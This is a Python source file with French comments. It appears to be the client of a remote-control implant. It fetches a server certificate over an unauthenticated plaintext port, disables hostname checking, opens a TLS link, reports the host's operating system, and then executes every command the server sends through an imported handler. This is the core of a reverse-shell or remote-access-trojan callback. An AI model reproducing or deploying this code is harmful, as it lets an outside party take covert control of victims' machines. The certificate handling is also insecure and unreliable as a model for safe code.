import os
import socket
import ssl
import platform
from command import handle_command

public_server_port = 8890

# Récupére le certificat du serveur
def retrieve_certificate(server_ip, port, cert_path):
    print("Tentative de récupération du certificat du serveur...")
    # Crée le répertoire pour le certificat si il n'existe pas
    os.makedirs(os.path.dirname(cert_path), exist_ok=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        # Connexion au serveur pour récupérer le certificat
        sock.connect((server_ip, port))
        sock.sendall(b"GET_CERT") # Envoi d'une demande pour obtenir le certificat
        with open(cert_path, 'wb') as cert_file: # Enregistrement du certificat reçu
            cert_file.write(sock.recv(4096))
    print("Certificat téléchargé.")

# Connecte le client au serveur avec une connexion sécurisée
def connect_to_server(host, port, cert_path):
    # Vérifie si le certificat existe, sinon, il tente de le récupérer
    if not os.path.exists(cert_path):
        retrieve_certificate(host, public_server_port, cert_path)  # Port non sécurisé pour récupération du certificat
    
    # Configuration du contexte SSL
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cert_path)
    context.check_hostname = False # Ne vérifie pas le nom d'hôte
    context.verify_mode = ssl.CERT_REQUIRED # Nécessite un certificat de serveur valide
    
    # Établissement de la connexion sécurisée avec le serveur
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connexion SSL établie.")
            os_type = platform.system() # Envoi du type de système d'exploitation au serveur
            ssock.send(os_type.encode('utf-8'))
            while True:
                cmd = ssock.recv(1024).decode() # Réception des commandes du serveur
                if not cmd:
                    break # Sortie de la boucle si aucune commande n'est reçue
                handle_command(ssock, cmd) # Traitement de la commande reçue
